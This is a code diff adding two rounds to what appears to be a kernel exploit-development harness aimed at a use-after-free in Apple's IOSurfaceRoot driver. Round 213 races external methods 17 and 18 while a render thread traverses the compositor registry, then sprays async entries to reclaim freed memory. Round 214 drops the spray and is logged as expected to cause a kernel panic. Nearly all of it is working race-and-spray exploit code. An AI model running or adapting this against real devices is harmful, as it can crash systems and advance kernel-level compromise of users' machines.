@@ -25985,6 +25985,197 @@ new_modes:
                 rlog("=== r=212 complete ===\n");
             }
 
+            /* r=213: Concurrent race + render + spray (reproduces Phase 13 crash)
+             *
+             * The key insight: the UAF only triggers when the compositor is
+             * ACTIVELY traversing the registry while the race creates/destroys
+             * entries. Sequential race→render doesn't crash because the entry
+             * is in a consistent state by the time the render starts.
+             *
+             * This version:
+             * 1. Starts the render loop first (compositor continuously walks registry)
+             * 2. Races sel17/sel18 WHILE render is active
+             * 3. Immediately sprays after each race batch to reclaim freed entries
+             * 4. Monitors for survival vs panic
+             *
+             * Usage: iosurface_sel17 213 [iters] [races]
+             */
+            if (rounds == 213) {
+                rlog("\n=== r=213: Concurrent race + render + spray ===\n");
+                int r213_iters = 300;
+                int r213_races = 5;
+                if (argc > 3) r213_iters = atoi(argv[3]);
+                if (argc > 4) r213_races = atoi(argv[4]);
+                rlog("  Iters: %d  Races: %d\n", r213_iters, r213_races);
+
+                io_service_t r213_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r213_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r213_done; }
+
+                /* Start render loop FIRST — compositor continuously traverses */
+                rlog("  Starting render loop...\n");
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r213_rt;
+                pthread_create(&r213_rt, NULL, p13_render_loop, NULL);
+                usleep(500000); /* let render stabilize */
+                rlog("  Render active, frames=%d\n", p13_render_frames);
+
+                int r213_survived = 0;
+
+                for (int race = 0; race < r213_races; race++) {
+                    rlog("  --- Race %d/%d ---\n", race + 1, r213_races);
+
+                    io_connect_t r213_rc = IO_OBJECT_NULL;
+                    IOServiceOpen(r213_svc, mach_task_self(), 0, &r213_rc);
+                    if (!r213_rc) { rlog("  open failed\n"); continue; }
+
+                    /* Sequential async/sync race WHILE render is active */
+                    uint64_t r213_inp[3] = {1, 2, 3};
+                    mach_port_t r213_wps[500];
+                    int r213_wn = 0;
+                    int r213_anom = 0;
+
+                    for (int i = 0; i < r213_iters && i < 500; i++) {
+                        mach_port_t wp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0xD213 + i;
+
+                        kern_return_t kr1 = IOConnectCallAsyncMethod(r213_rc, 17, wp, &ref, 1,
+                            NULL, 0, r213_inp, 24, NULL, NULL, NULL, NULL);
+                        kern_return_t kr2 = IOConnectCallMethod(r213_rc, 18, NULL, 0,
+                            r213_inp, 24, NULL, NULL, NULL, NULL);
+
+                        if (kr1 != 0 || kr2 != 0) r213_anom++;
+                        r213_wps[r213_wn++] = wp;
+                    }
+                    rlog("  Race: %d iters, %d anom, f=%d\n",
+                         r213_iters, r213_anom, p13_render_frames);
+
+                    /* Spray IMMEDIATELY to reclaim freed entries */
+                    io_connect_t r213_sconns[4];
+                    int r213_sn = 0;
+                    mach_port_t r213_swps[256];
+                    for (int c = 0; c < 4; c++) {
+                        r213_sconns[c] = IO_OBJECT_NULL;
+                        IOServiceOpen(r213_svc, mach_task_self(), 0, &r213_sconns[c]);
+                        if (!r213_sconns[c]) continue;
+                        for (int e = 0; e < 64; e++) {
+                            mach_port_t wp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                            mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0x2130000 + r213_sn;
+                            uint64_t inp[3] = {(uint64_t)(r213_sn + 0x2000), 0, 0};
+                            IOConnectCallAsyncMethod(r213_sconns[c], 17, wp, &ref, 1,
+                                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+                            r213_swps[r213_sn++] = wp;
+                        }
+                    }
+                    rlog("  Spray: %d entries\n", r213_sn);
+
+                    /* Wait 2s for compositor to hit reclaimed entries */
+                    usleep(2000000);
+                    rlog("  SURVIVED race %d (f=%d)\n", race + 1, p13_render_frames);
+                    r213_survived++;
+
+                    /* Cleanup spray and race resources */
+                    IOServiceClose(r213_rc);
+                    for (int c = 0; c < 4; c++)
+                        if (r213_sconns[c]) IOServiceClose(r213_sconns[c]);
+                    for (int i = 0; i < r213_wn; i++)
+                        mach_port_deallocate(mach_task_self(), r213_wps[i]);
+                    for (int i = 0; i < r213_sn; i++)
+                        mach_port_deallocate(mach_task_self(), r213_swps[i]);
+                    usleep(200000);
+                }
+
+                /* Stop render loop */
+                p13_render_run = 0;
+                pthread_join(r213_rt, NULL);
+
+                rlog("\n=== r=213 RESULTS ===\n");
+                rlog("  Survived: %d/%d  Total frames: %d\n",
+                     r213_survived, r213_races, p13_render_frames);
+
+                IOObjectRelease(r213_svc);
+                r213_done:
+                rlog("=== r=213 complete ===\n");
+            }
+
+            /* r=214: Concurrent race + render, NO spray (diagnostic — expects panic)
+             *
+             * Same as r=213 but without spray — if the race creates dangling
+             * entries, the compositor will follow stale/zero pointers and crash.
+             * Confirms that CONCURRENT race+render is the trigger.
+             *
+             * Usage: iosurface_sel17 214 [iters] [races]
+             */
+            if (rounds == 214) {
+                rlog("\n=== r=214: Concurrent race + render, NO spray ===\n");
+                rlog("  WARNING: Expected to cause kernel panic!\n");
+                int r214_iters = 500;
+                int r214_races = 10;
+                if (argc > 3) r214_iters = atoi(argv[3]);
+                if (argc > 4) r214_races = atoi(argv[4]);
+                rlog("  Iters: %d  Races: %d\n", r214_iters, r214_races);
+
+                io_service_t r214_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r214_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r214_done; }
+
+                /* Start render loop FIRST */
+                rlog("  Starting render loop...\n");
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r214_rt;
+                pthread_create(&r214_rt, NULL, p13_render_loop, NULL);
+                usleep(500000);
+                rlog("  Render active, frames=%d\n", p13_render_frames);
+
+                for (int race = 0; race < r214_races; race++) {
+                    rlog("  --- Race %d/%d ---\n", race + 1, r214_races);
+
+                    io_connect_t r214_rc = IO_OBJECT_NULL;
+                    IOServiceOpen(r214_svc, mach_task_self(), 0, &r214_rc);
+                    if (!r214_rc) { rlog("  open failed\n"); continue; }
+
+                    uint64_t r214_inp[3] = {1, 2, 3};
+                    int r214_anom = 0;
+
+                    for (int i = 0; i < r214_iters; i++) {
+                        mach_port_t wp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0xD214 + i;
+
+                        kern_return_t kr1 = IOConnectCallAsyncMethod(r214_rc, 17, wp, &ref, 1,
+                            NULL, 0, r214_inp, 24, NULL, NULL, NULL, NULL);
+                        kern_return_t kr2 = IOConnectCallMethod(r214_rc, 18, NULL, 0,
+                            r214_inp, 24, NULL, NULL, NULL, NULL);
+
+                        if (kr1 != 0 || kr2 != 0) r214_anom++;
+                        mach_port_deallocate(mach_task_self(), wp);
+                    }
+                    rlog("  Race: %d iters, %d anom, f=%d\n",
+                         r214_iters, r214_anom, p13_render_frames);
+
+                    /* NO spray — leave dangling entry exposed */
+                    usleep(1000000);
+                    rlog("  SURVIVED race %d\n", race + 1);
+
+                    IOServiceClose(r214_rc);
+                    usleep(200000);
+                }
+
+                p13_render_run = 0;
+                pthread_join(r214_rt, NULL);
+                rlog("  Total frames: %d\n", p13_render_frames);
+                IOObjectRelease(r214_svc);
+                r214_done:
+                rlog("=== r=214 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
